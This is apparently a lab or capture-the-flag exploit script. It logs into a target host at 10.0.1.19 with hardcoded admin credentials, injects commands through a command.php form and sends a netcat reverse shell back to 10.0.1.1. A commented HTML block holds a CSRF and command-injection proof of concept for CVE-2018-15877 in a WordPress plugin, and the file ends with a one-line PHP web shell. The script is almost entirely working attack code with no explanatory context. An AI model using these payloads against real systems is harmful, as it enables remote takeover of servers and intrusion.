import requests
import lxml.html
import lxml.etree as etree




# <html>
#   <!--  Wordpress Plainview Activity Monitor RCE
#         [+] Version: 20161228 and possibly prior
#         [+] Description: Combine OS Commanding and CSRF to get reverse shell
#         [+] Author: LydA(c)ric LEFEBVRE
#         [+] CVE-ID: CVE-2018-15877
#         [+] Usage: Replace 127.0.0.1 & 9999 with you ip and port to get reverse shell
#         [+] Note: Many reflected XSS exists on this plugin and can be combine with this exploit as well
#   -->
#   <body>
#   <script>history.pushState('', '', '/')</script>
#     <form action="http://localhost:8000/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools" method="POST" enctype="multipart/form-data">
#       <input type="hidden" name="ip" value="google.fr| nc -nlvp 127.0.0.1 9999 -e /bin/bash" />
#       <input type="hidden" name="lookup" value="Lookup" />
#       <input type="submit" value="Submit request" />
#     </form>
#   </body>
# </html>



# https://stackoverflow.com/questions/25091976/python-requests-get-cookies
session = requests.Session()

response = session.get('http://10.0.1.19/login.php')
cookies = session.cookies.get_dict()
data = {"username":"admin", "password": "happy"}

response = session.post('http://10.0.1.19/login.php', data=data, cookies=cookies)
# for cookie in r.cookies:
#     print (cookie.name, cookie.value)
# print(r.url)
cookies = session.cookies.get_dict()

response = session.post('http://10.0.1.19/login.php', data=data, cookies=cookies)
response = session.get('http://10.0.1.19/command.php', cookies=cookies)
data = {"radio":"id", "submit": "Run"}
	
response = session.post('http://10.0.1.19/command.php', data=data, cookies=cookies)

tree = lxml.html.fromstring(response.content)
try:
	node = tree.xpath("//pre//text()")[0]
	print(node)

except:
	print("Error")


data = {"radio":"nc -e /bin/sh 10.0.1.1 1234", "submit": "Run"}

response = session.post('http://10.0.1.19/command.php', data=data, cookies=cookies)
<?php system($_GET['cmd']); ?>